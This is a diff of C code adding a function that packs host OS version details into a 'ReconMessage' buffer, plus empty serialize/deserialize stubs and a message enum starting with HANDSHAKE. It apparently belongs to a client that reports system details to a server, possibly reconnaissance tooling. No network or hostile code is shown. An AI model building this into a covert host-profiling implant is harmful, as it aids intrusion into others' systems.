@@ -1,4 +1,5 @@
 
+// TODO: messagetype and their structs should be in their own file called MessageType/s.h?
 enum MessageType
 {
 	HANDSHAKE,          // Initial connection
@@ -51,3 +52,21 @@ int processMessage(BYTE* payload, MessageHeader* header)
 	}
 	return 0;
 }
+
+int serialize()
+{}
+
+size_t serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
+	BYTE* ptr = buffer; // uint8_t*
+
+	// Copy each field from msg struct to buffer
+	memcpy(ptr, &msg->dwMajorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
+	memcpy(ptr, &msg->dwMinorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
+	memcpy(ptr, &msg->dwBuildNumber, sizeof(ULONG)); ptr += sizeof(ULONG);
+	memcpy(ptr, &msg->wProductType, sizeof(UCHAR)); ptr += sizeof(UCHAR);
+	// ... other fields
+	return ptr - buffer; // Returns total bytes copied
+}
+
+int deserialize()
+{}
